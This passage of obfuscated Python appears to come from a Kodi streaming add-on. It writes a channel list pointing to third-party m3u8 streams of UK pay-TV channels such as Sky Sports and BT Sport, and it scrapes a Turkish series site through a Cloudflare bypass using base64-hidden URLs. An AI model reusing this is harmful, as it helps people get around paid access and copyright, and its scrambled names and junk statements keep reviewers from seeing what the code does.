 if 28 - 28: OOooOOo
 O000oOoIiiIIi1 . write ( r'# This file contains the "built-in" channels' + '\n' )
 O000oOoIiiIIi1 . write ( r'# It is parsed by Pythons ConfigParser' + '\n\n' )
 O000oOoIiiIIi1 . write ( r'[plugin.video.GenieTv]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BBC One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F191.m3u8&mode=10012&name=[COLORgreen]BBC+One%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BBC Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F190.m3u8&mode=10012&name=[COLORgreen]BBC+Two%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BBC Four=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F188.m3u8&mode=10012&name=[COLORgreen]BBC+Four%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'ITV=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F208.m3u8&mode=10012&name=[COLORgreen]ITV1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'ITV2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F207.m3u8&mode=10012&name=[COLORgreen]ITV2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'ITV3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F206.m3u8&mode=10012&name=[COLORgreen]ITV3%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'ITV4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F205.m3u8&mode=10012&name=[COLORgreen]ITV4%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Channel 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F183.m3u8&mode=10012&name=[COLORgreen]Channel+4%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Channel 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F185.m3u8&mode=10012&name=[COLORgreen]Channel+5%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'5STAR=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F187.m3u8&mode=10012&name=[COLORgreen]5%2A%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'5 USA=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F186.m3u8&mode=10012&name=[COLORgreen]5USA%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'RTE One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F194.m3u8&mode=10012&name=[COLORgreen]RTE+One%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'RTE Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F193.m3u8&mode=10012&name=[COLORgreen]RTE+Two%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'TG4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F192.m3u8&mode=10012&name=[COLORgreen]TG4%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F32.m3u8&mode=10012&name=[COLORgreen]Sky+1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F33.m3u8&mode=10012&name=[COLORgreen]Sky+2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Living=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F35.m3u8&mode=10012&name=[COLORgreen]Sky+Living%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Atlantic=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F34.m3u8&mode=10012&name=[COLORgreen]Sky+Atlantic%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Dave=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F325.m3u8&mode=10012&name=[COLORgreen]Dave%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Pick=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F324.m3u8&mode=10012&name=[COLORgreen]Pick%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'GOLD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F326.m3u8&mode=10012&name=[COLORgreen]Gold%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Watch HD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F518.m3u8&mode=10012&name=[COLORgreen]Watch%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'YESTERDAY=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F377.m3u8&mode=10012&name=[COLORgreen]Yesterday%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Comedy Central=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F181.m3u8&mode=10012&name=[COLORgreen]Comedy+Central%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'London Live=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F830.m3u8&mode=10012&name=[COLORgreen]London+Live%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Disney Junior=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F230.m3u8&mode=10012&name=[COLORgreen]Disney+Jr.%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Disney Chnl=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F231.m3u8&mode=10012&name=[COLORgreen]Disney+Channel%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Animal Planet=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F198.m3u8&mode=10012&name=[COLORgreen]Animal+Planet%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Nat Geo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F197.m3u8&mode=10012&name=[COLORgreen]National+Geographic+Channel%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Discovery=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F200.m3u8&mode=10012&name=[COLORgreen]Discovery+Channel%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Discovery Science=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F199.m3u8&mode=10012&name=[COLORgreen]Discovery+Science%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Disc.Turbo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F168.m3u8&mode=10012&name=[COLORgreen]Discovery+Turbo%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Food Network=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F639.m3u8&mode=10012&name=[COLORgreen]Food+Network%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'MTV MUSIC=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F234.m3u8&mode=10012&name=[COLORgreen]MTV+Music%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Film4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F182.m3u8&mode=10012&name=[COLORgreen]Film4%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'True Movies=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F853.m3u8&mode=10012&name=[COLORgreen]True+Movies%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'True Movies 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F852.m3u8&mode=10012&name=[COLORgreen]True+Movies+2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Action=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F732.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Action+%26+Adventure%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky ScFiHorror=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F511.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Sci-Fi+%26+Horror%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'SkyPremiereHD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F516.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Premiere%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Greats=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F512.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Greats%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Family=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F509.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Family%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky DramaRom=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F510.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Drama+%26+Romance%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Thriller=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F514.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Crime+%26+Thriller%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Comedy=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F513.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Comedy%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Showcase=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F46.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Showcase%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Select=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F45.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Select%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Disney=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F195.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Disney%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F18.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F19.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports 3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F20.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+3%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F21.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+4%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F22.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+5%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports F1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F24.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+F1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Sky Sports News=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F23.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+News%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BT Sport 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F309.m3u8&mode=10012&name=[COLORgreen]BT+Sport+1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BT Sport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F26.m3u8&mode=10012&name=[COLORgreen]BT+Sport+2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BT Sport Europe=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F705.m3u8&mode=10012&name=[COLORgreen]BT+Sport+Europe%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'BT Sport ESPN=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F28.m3u8&mode=10012&name=[COLORgreen]BT+Sport+ESPN%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Box Nation=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F173.m3u8&mode=10012&name=[COLORgreen]Box+Nation%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'WWENetwork=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F178.m3u8&mode=10012&name=[COLORgreen]WWENetwork%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Eurosport=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F269.m3u8&mode=10012&name=[COLORgreen]Eurosport+1%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Eurosport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F748.m3u8&mode=10012&name=[COLORgreen]Eurosport+2%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'At The Races=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F170.m3u8&mode=10012&name=[COLORgreen]At+the+Races%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Racing UK=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F171.m3u8&mode=10012&name=[COLORgreen]Racing+UK%0D[%2FCOLOR]' + '\n' )
 O000oOoIiiIIi1 . write ( r'Poker central US=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fpiesustv.net%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F826.m3u8&mode=10012&name=[COLORgreen]Poker+central+US%0D[%2FCOLOR]' + '\n' )
 if 45 - 45: OOooOOo . OOOo0 / I1I1ii - Oo * iIii1I11I1II1
 if 86 - 86: OoOoOO00 + oOO + iI1Ii11iII1
 if 9 - 9: oOO + OoOoOO00 % oOO % iI1Ii11iII1 + iIii1I11I1II1
def oO00 ( ) :
 if 7 - 7: O0 % I1I1ii + ii11ii1ii + oO0O % OoooooooOO . Oo
 O00OOOoOoo0O ( '[COLORgreen]Recent Episodes[/COLOR]' , '' , 10019 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Genres[/COLOR]' , '' , 10020 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Search[/COLOR]' , '' , 10021 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 56 - 56: II1i1IiiIIi11
def oOooo00O ( ) :
 if 66 - 66: I1IiI + i1IIi % OoOoOO00 . O0 * ii11ii1ii % ii11ii1ii
 IIIII1II = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 OoOO0oo0o = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( IIIII1II )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO , oO00oooOOoOo0 in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO + '  -  ' + ( oO00oooOOoOo0 ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , I1i11i , 10023 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 87 - 87: i11i1 + OOooOOo . II1i1IiiIIi11 - OoooooooOO
  if 6 - 6: iIii1I11I1II1 * OoooooooOO
  if 28 - 28: Oo * OOooOOo / I1I1ii
def Oo0O ( ) :
 if 88 - 88: OOOo0 % i11i1 % ii11ii1ii . i11iIiiIii % OOooOOo
 O00OOOoOoo0O ( '[COLORgreen]Action[/COLOR]' , 'Aksiyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Adventure[/COLOR]' , 'Macera' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Animation[/COLOR]' , 'Animasyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Anime[/COLOR]' , 'Anime' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Biography[/COLOR]' , 'Biyografi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Comedy[/COLOR]' , 'Komedi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Crime[/COLOR]' , 'Su%C3%A7' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Documentary[/COLOR]' , 'Belgesel' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Drama[/COLOR]' , 'Dram' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Family[/COLOR]' , 'Aile' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Fantasy[/COLOR]' , 'Fantastik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]History[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Horror[/COLOR]' , 'Korku' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Mini-Series[/COLOR]' , 'Mini%20Dizi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Musical[/COLOR]' , 'M%C3%BCzikal' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Mystery[/COLOR]' , 'Gizem' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Romance[/COLOR]' , 'Romantik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Science Fiction[/COLOR]' , 'Bilim%20Kurgu' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Sport[/COLOR]' , 'Spor' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Thriller[/COLOR]' , 'Gerilim' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]War[/COLOR]' , 'Sava%C5%9F' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Western[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( '[COLORgreen]Youth[/COLOR]' , 'Gen%C3%A7lik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 38 - 38: I1I1ii + OoooooooOO . i1IIi
def I1III1iIi ( url ) :
 i1II1 = 'http://dizilab.com/arsiv?limit=100&tur=' + url + '&orderby=&ulke=&order=&yil=&dizi_adi='
 oO0 = cloudflare . source ( i1II1 )
 OoOO0oo0o = re . compile ( '<div class="tv-series-single">.+?<a href="(.+?)" class="film-image">.+?<img src="(.+?)" alt=""/>.+?<span class="position">.+?</span>\n(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
 for url , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , url , 10022 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 82 - 82: OOOo0 + II1i1IiiIIi11 + ii11ii1ii * OOOo0 % i11iIiiIii % II1i1IiiIIi11
  if 23 - 23: i1IIi . iIii1I11I1II1 . i11i1 . O0 % oO0O % i11iIiiIii
  if 11 - 11: O0 - OoOoOO00 . i11i1 . oO0O % I1I1ii
  if 21 - 21: Oo / II1i1IiiIIi11 . I1I1ii * OoooooooOO + OOoo0OO0 - i1IIi
def ooooo0O0 ( ) :
 if 10 - 10: OOoo0OO0 - Oo
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 IIo0Oo0oO0oOO00 = Ooo0OOoOoO0 . lower ( )
 I1i11i = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' )
 oO0 = cloudflare . source ( I1i11i )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( oO0 )
 for I1i11i , IIIIiI11I11 , OO0ooOOO0OOO in OoOO0oo0o :
  if Ooo0OOoOoO0 in OO0ooOOO0OOO . lower ( ) :
